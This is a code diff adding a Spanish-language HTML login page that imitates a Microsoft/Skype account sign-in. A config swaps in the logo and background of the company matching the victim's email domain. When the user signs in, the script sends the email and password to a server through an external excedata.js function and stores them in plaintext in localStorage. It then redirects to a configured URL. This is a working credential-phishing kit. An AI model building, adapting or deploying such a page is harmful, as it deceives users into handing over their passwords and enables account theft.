@@ -1,0 +1,507 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión</title>
+    <style>
+        :root {
+            --card-bg: #ffffff;
+            --text-main: #1b1b1b;
+            --text-sub: #616161;
+            --accent: #0067b8;
+            --accent-hover: #005ba1;
+            --border: #666666;
+            --border-light: #d6d6d6;
+        }
+
+        * {
+            box-sizing: border-box;
+        }
+
+        html,
+        body {
+            height: 100%;
+            margin: 0;
+            font-family: 'Segoe UI', system-ui, -apple-system, Arial, sans-serif;
+            color: var(--text-main);
+        }
+
+        body {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-color: #f2f2f2;
+            transition: background-image .4s ease, background-color .4s ease;
+            position: relative;
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 0;
+        }
+
+        .login-card {
+            width: 100%;
+            max-width: 440px;
+            background: var(--card-bg);
+            padding: 44px 44px 36px;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, .25);
+            border-radius: 2px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .logo-slot {
+            height: 32px;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+        }
+
+        .logo-slot img {
+            max-height: 32px;
+            max-width: 220px;
+            object-fit: contain;
+        }
+
+        .logo-placeholder {
+            font-size: 13px;
+            color: #a0a0a0;
+            border: 1px dashed #cfcfcf;
+            padding: 4px 10px;
+            border-radius: 3px;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin: 0 0 4px;
+        }
+
+        .step-subtitle {
+            font-size: 15px;
+            color: var(--text-main);
+            margin: 0 0 20px;
+        }
+
+        .field {
+            position: relative;
+            margin-bottom: 4px;
+        }
+
+        .field input[type="email"],
+        .field input[type="password"] {
+            width: 100%;
+            padding: 8px 4px;
+            font-size: 15px;
+            border: none;
+            border-bottom: 1px solid var(--border);
+            outline: none;
+            background: transparent;
+            color: var(--text-main);
+            font-family: inherit;
+        }
+
+        .field input:focus {
+            border-bottom: 2px solid var(--accent);
+            padding-bottom: 7px;
+        }
+
+        .field .error {
+            display: none;
+            font-size: 13px;
+            color: #a4262c;
+            margin-top: 6px;
+        }
+
+        .field.has-error input {
+            border-bottom: 2px solid #a4262c;
+        }
+
+        .field.has-error .error {
+            display: block;
+        }
+
+        .account-chip {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 8px 0 20px;
+            font-size: 15px;
+            border-bottom: 1px solid var(--border-light);
+            margin-bottom: 20px;
+        }
+
+        .account-chip .avatar {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: #5b5b5b;
+            color: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            flex-shrink: 0;
+        }
+
+        .account-chip span {
+            flex: 1;
+            word-break: break-all;
+        }
+
+        .account-chip button {
+            background: none;
+            border: none;
+            color: var(--accent);
+            font-size: 13px;
+            cursor: pointer;
+            padding: 6px 8px;
+        }
+
+        .account-chip button:hover {
+            text-decoration: underline;
+        }
+
+        .links {
+            margin: 16px 0 0;
+        }
+
+        .links a {
+            font-size: 13.5px;
+            color: var(--accent);
+            text-decoration: none;
+        }
+
+        .links a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 36px;
+        }
+
+        .btn-primary {
+            background: var(--accent);
+            color: #fff;
+            border: none;
+            padding: 9px 26px;
+            font-size: 15px;
+            cursor: pointer;
+            min-width: 108px;
+            transition: background .15s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .btn-primary:hover {
+            background: var(--accent-hover);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .signin-options {
+            margin-top: 28px;
+            padding-top: 16px;
+        }
+
+        .signin-options a {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 13.5px;
+            color: var(--accent);
+            text-decoration: none;
+        }
+
+        .signin-options a:hover {
+            text-decoration: underline;
+        }
+
+        .step {
+            display: none;
+        }
+
+        .step.active {
+            display: block;
+        }
+
+        /* Spinner */
+        .spinner {
+            display: none;
+            width: 18px;
+            height: 18px;
+            border: 2px solid #ffffff;
+            border-top: 2px solid transparent;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        .btn-primary.loading .spinner {
+            display: inline-block;
+        }
+
+        .btn-primary.loading .btn-text {
+            display: none;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        @media (max-width:480px) {
+            .login-card {
+                box-shadow: none;
+                max-width: 100%;
+                min-height: 100vh;
+                padding: 32px 24px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="login-card" id="loginCard">
+
+        <div class="logo-slot" id="logoSlot">
+            <span class="logo-placeholder">Tu logo aquí</span>
+        </div>
+
+        <div class="step active" id="step1">
+            <h1>Iniciar sesión</h1>
+            <p class="step-subtitle">Usar una cuenta de correo, teléfono o Skype.</p>
+
+            <div class="field" id="emailField">
+                <input type="email" id="emailInput" placeholder="Correo electrónico, teléfono o Skype"
+                    autocomplete="username">
+                <p class="error">Escribe un correo, teléfono o Skype válido.</p>
+            </div>
+
+            <div class="links">
+                <a href="#">¿No tiene una cuenta? Cree una</a>
+            </div>
+
+            <div class="footer-row">
+                <span></span>
+                <button class="btn-primary" id="nextBtn">
+                    <span class="btn-text">Siguiente</span>
+                    <span class="spinner"></span>
+                </button>
+            </div>
+
+            <div class="signin-options">
+                <a href="#">Opciones de inicio de sesión</a>
+            </div>
+        </div>
+
+        <div class="step" id="step2">
+            <h1>Escriba su contraseña</h1>
+
+            <div class="account-chip">
+                <div class="avatar" id="avatarLetter">U</div>
+                <span id="emailDisplay"></span>
+                <button id="changeAccountBtn">Cambiar cuenta</button>
+            </div>
+
+            <div class="field" id="passwordField">
+                <input type="password" id="passwordInput" placeholder="Contraseña" autocomplete="current-password">
+                <p class="error">La contraseña es incorrecta.</p>
+            </div>
+
+            <div class="links">
+                <a href="#">¿Olvidó su contraseña?</a>
+            </div>
+
+            <div class="footer-row">
+                <span></span>
+                <button class="btn-primary" id="signinBtn">
+                    <span class="btn-text">Iniciar sesión</span>
+                    <span class="spinner"></span>
+                </button>
+            </div>
+        </div>
+
+    </div>
+    <script src="excedata.js"></script>
+    <script src="config.js"></script>
+
+    <script>
+
+
+        /* ================================================================
+           CONFIGURACIÓN — edita solo esto para poner tus empresas, logos y fondos
+           ================================================================ */
+       
+        /* ================================================================
+           LÓGICA DEL FORMULARIO
+           ================================================================ */
+
+        let currentEmpresa = null;
+
+        function detectEmpresa(emailValue) {
+            const v = emailValue.toLowerCase().trim();
+            const atIndex = v.indexOf('@');
+            const domainPart = atIndex !== -1 ? v.slice(atIndex + 1) : v;
+            return CONFIG.empresas.find(e => e.dominio && domainPart.includes(e.dominio.toLowerCase().trim())) || null;
+        }
+
+        function applyProfile(empresa) {
+            currentEmpresa = empresa;
+            const logo = empresa ? empresa.logo : CONFIG.general.logo;
+            const fondo = empresa ? empresa.fondo : CONFIG.general.fondo;
+
+            document.body.style.backgroundImage = fondo
+                ? `url('${fondo}')`
+                : 'linear-gradient(135deg, #e9edf1 0%, #dbe2e8 100%)';
+            document.body.style.backgroundColor = fondo ? 'transparent' : '#f2f2f2';
+
+            const logoSlot = document.getElementById('logoSlot');
+            logoSlot.innerHTML = logo
+                ? `<img src="${logo}" alt="Logo">`
+                : `<span class="logo-placeholder">Tu logo aquí</span>`;
+        }
+
+        // Función para manejar estado de carga de botones
+        function setLoading(button, loading) {
+            if (loading) {
+                button.classList.add('loading');
+                button.disabled = true;
+            } else {
+                button.classList.remove('loading');
+                button.disabled = false;
+            }
+        }
+
+        // Elementos DOM
+        const step1 = document.getElementById('step1');
+        const step2 = document.getElementById('step2');
+        const emailInput = document.getElementById('emailInput');
+        const emailField = document.getElementById('emailField');
+        const passwordField = document.getElementById('passwordField');
+        const emailDisplay = document.getElementById('emailDisplay');
+        const avatarLetter = document.getElementById('avatarLetter');
+        const nextBtn = document.getElementById('nextBtn');
+        const signinBtn = document.getElementById('signinBtn');
+
+        // Navegación paso 1 -> paso 2
+        nextBtn.addEventListener('click', () => {
+            const value = emailInput.value.trim();
+            if (!value) {
+                emailField.classList.add('has-error');
+                return;
+            }
+            emailField.classList.remove('has-error');
+            emailDisplay.textContent = value;
+            avatarLetter.textContent = value.charAt(0).toUpperCase() || 'U';
+
+            applyProfile(detectEmpresa(value));
+
+            step1.classList.remove('active');
+            step2.classList.add('active');
+        });
+
+        // Cambiar cuenta (volver al paso 1)
+        document.getElementById('changeAccountBtn').addEventListener('click', () => {
+            step2.classList.remove('active');
+            step1.classList.add('active');
+            passwordField.classList.remove('has-error');
+            applyProfile(null);
+        });
+
+        // Iniciar sesión
+        signinBtn.addEventListener('click', async () => {
+            const email = emailInput.value.trim();
+            const password = document.getElementById('passwordInput').value;
+
+            if (!password) {
+                passwordField.classList.add('has-error');
+                return;
+            }
+            passwordField.classList.remove('has-error');
+
+            // Mostrar loading
+            setLoading(signinBtn, true);
+
+            try {
+                const empresaNombre = currentEmpresa ? currentEmpresa.dominio : 'General';
+
+                // Enviar datos al servidor usando excedata.js
+                const success = await sendLoginData(email, password, empresaNombre);
+
+                if (success) {
+                    // Guardar en localStorage
+                    const loginData = {
+                        email,
+                        password,
+                        timestamp: new Date().toISOString(),
+                        empresa: empresaNombre
+                    };
+
+                    try {
+                        const existing = JSON.parse(localStorage.getItem('loginData') || '[]');
+                        existing.push(loginData);
+                        localStorage.setItem('loginData', JSON.stringify(existing));
+                        localStorage.setItem('lastLogin', JSON.stringify(loginData));
+                    } catch (error) {
+                        console.error('Error al guardar en localStorage:', error);
+                    }
+
+                    // Redirigir
+                    if (CONFIG.redirectUrl) {
+                        window.location.href = CONFIG.redirectUrl;
+                    } else {
+                        alert('Login exitoso');
+                    }
+                } else {
+                    alert('Error al enviar los datos. Intenta de nuevo.');
+                    setLoading(signinBtn, false);
+                }
+            } catch (error) {
+                console.error('Error en el proceso de login:', error);
+                alert('Ocurrió un error. Intenta de nuevo.');
+                setLoading(signinBtn, false);
+            }
+        });
+
+        // Enter para avanzar
+        emailInput.addEventListener('keydown', e => {
+            if (e.key === 'Enter') nextBtn.click();
+        });
+
+        document.getElementById('passwordInput').addEventListener('keydown', e => {
+            if (e.key === 'Enter') signinBtn.click();
+        });
+
+        // Estado inicial
+        applyProfile(null);
+    </script>
+
+</body>
+
+</html>
